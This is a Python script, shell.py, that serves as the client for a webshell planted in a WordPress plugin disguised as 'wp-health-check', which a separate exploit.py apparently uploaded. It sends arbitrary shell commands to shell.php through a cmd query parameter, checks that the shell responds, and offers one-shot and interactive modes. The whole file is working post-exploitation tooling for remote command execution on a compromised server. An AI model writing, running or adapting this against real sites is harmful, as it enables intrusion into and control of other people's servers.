#!/usr/bin/env python3
"""
shell.py — client for the wp-health-check webshell dropped by exploit.py

Usage:
    python3 shell.py                        # interactive REPL
    python3 shell.py "id && uname -a"       # one-shot
    python3 shell.py -c "ls -la /var/www"   # explicit one-shot
    python3 shell.py --target http://host:8080 ...
"""
import argparse
import sys

import requests

DEFAULT_PATH = "/wp-content/plugins/wp-health-check/shell.php"


def run(session: requests.Session, shell_url: str, cmd: str) -> str:
    """Send one command through ?cmd= and return the body."""
    r = session.get(shell_url, params={"cmd": cmd}, timeout=30)
    if r.status_code != 200:
        return f"[HTTP {r.status_code}] {r.text[:200]}"
    return r.text


def main() -> int:
    p = argparse.ArgumentParser(description="Interact with the uploaded wp2shell webshell")
    p.add_argument("--target", default="http://localhost:8080", help="WordPress base URL")
    p.add_argument("--path", default=DEFAULT_PATH, help="Path to shell.php on the target")
    p.add_argument("-c", "--cmd", help="Run a single command and exit")
    p.add_argument("command", nargs="*", help="Positional command (alternative to -c)")
    args = p.parse_args()

    shell_url = args.target.rstrip("/") + args.path

    session = requests.Session()
    session.headers.update({"User-Agent": "wp2shell-client/1.0"})

    # Reachability / sanity probe
    try:
        probe = session.get(shell_url, params={"cmd": "echo WP2SHELL_OK"}, timeout=10)
    except requests.RequestException as e:
        print(f"[!] Cannot reach {shell_url}: {e}", file=sys.stderr)
        return 1
    if "WP2SHELL_OK" not in probe.text:
        print(f"[!] Shell responded but didn't echo back — got: {probe.text[:200]!r}",
              file=sys.stderr)
        print("[!] Is the plugin uploaded & activated? (see exploit.py Step 4)", file=sys.stderr)
        return 1

    # One-shot mode (either -c or positional args joined)
    one_shot = args.cmd if args.cmd is not None else (" ".join(args.command) or None)
    if one_shot:
        sys.stdout.write(run(session, shell_url, one_shot))
        return 0

    # Interactive REPL
    print(f"[+] Connected to {shell_url}")
    print("[+] Each command runs in the plugin directory (shell.php's cwd).")
    print("[+] 'cd X && cmd' works within a single request; 'cd' alone does NOT persist.")
    print("[+] 'exit' or Ctrl-D to quit.")
    while True:
        try:
            cmd = input("wp2shell> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit"):
            break
        out = run(session, shell_url, cmd)
        sys.stdout.write(out if out.endswith("\n") else out + "\n")


if __name__ == "__main__":
    sys.exit(main())
